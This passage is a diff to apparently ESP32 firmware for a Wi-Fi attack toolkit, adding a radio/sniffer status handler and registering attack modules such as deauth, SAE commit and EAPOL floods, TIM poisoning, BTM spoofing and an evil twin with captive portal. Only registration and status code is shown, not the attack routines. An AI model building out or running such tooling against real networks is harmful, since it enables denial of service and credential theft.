+  const esp_err_t e2 = esp_wifi_get_promiscuous_filter(&type_filter);
+  const esp_err_t e3 = esp_wifi_get_promiscuous_ctrl_filter(&ctrl_filter);
+  esp_wifi_get_channel(&prim, &sec);
+  wb_reply_printf(reply,
+                  "RADIO promisc=%u(%d) filter=0x%08X(%d) ctrl_filter=0x%08X(%d) ch=%u owner=%s rtake=%u\n",
+                  (unsigned)(promisc ? 1 : 0), (int)e1, (unsigned)type_filter.filter_mask,
+                  (int)e2, (unsigned)ctrl_filter.filter_mask, (int)e3, (unsigned)prim,
+                  radio_owner()[0] != 0 ? radio_owner() : "none",
+                  (unsigned)radio_takeovers());
+  return WB_OK;
+}
+
+const wb_method_t kRadioMethods[] = {
+    {.name = "status", .args = nullptr, .n_args = 0, .handler = radio_bus_status,
+     .summary = "sniffer state, channel and channel-arbiter owner"},
+};
+
 const wb_object_t kObjects[] = {
     {.name = "deauth",
      .title = "Deauth / disassoc flood",
@@ -510,6 +1198,51 @@ const wb_object_t kObjects[] = {
      .methods = kBaMethods,
      .n_methods = (int)(sizeof(kBaMethods) / sizeof(kBaMethods[0])),
      .events = "state"},
+    {.name = "wnm",
+     .title = "802.11v BTM Request spoof",
+     .methods = kWnmMethods,
+     .n_methods = (int)(sizeof(kWnmMethods) / sizeof(kWnmMethods[0])),
+     .events = "state"},
+    {.name = "tim",
+     .title = "TIM poisoning (cloned beacon)",
+     .methods = kTimMethods,
+     .n_methods = (int)(sizeof(kTimMethods) / sizeof(kTimMethods[0])),
+     .events = "state"},
+    {.name = "eapol",
+     .title = "EAPOL-Start/Logoff flood",
+     .methods = kEapolMethods,
+     .n_methods = (int)(sizeof(kEapolMethods) / sizeof(kEapolMethods[0])),
+     .events = "state"},
+    {.name = "pspoll",
+     .title = "PS bit (power management) spoof",
+     .methods = kPspollMethods,
+     .n_methods = (int)(sizeof(kPspollMethods) / sizeof(kPspollMethods[0])),
+     .events = "state"},
+    {.name = "sae",
+     .title = "SAE Commit flood",
+     .methods = kSaeMethods,
+     .n_methods = (int)(sizeof(kSaeMethods) / sizeof(kSaeMethods[0])),
+     .events = "state"},
+    {.name = "authflood",
+     .title = "Auth / assoc flood",
+     .methods = kAuthfloodMethods,
+     .n_methods = (int)(sizeof(kAuthfloodMethods) / sizeof(kAuthfloodMethods[0])),
+     .events = "state"},
+    {.name = "probe",
+     .title = "Probe / beacon flood",
+     .methods = kProbeMethods,
+     .n_methods = (int)(sizeof(kProbeMethods) / sizeof(kProbeMethods[0])),
+     .events = "state"},
+    {.name = "evil",
+     .title = "Evil twin + captive portal",
+     .methods = kEvilMethods,
+     .n_methods = (int)(sizeof(kEvilMethods) / sizeof(kEvilMethods[0])),
+     .events = "state"},
+    {.name = "radio",
+     .title = "Radio / sniffer / channel arbiter",
+     .methods = kRadioMethods,
+     .n_methods = (int)(sizeof(kRadioMethods) / sizeof(kRadioMethods[0])),
+     .events = ""},
 };
 
 }  // namespace
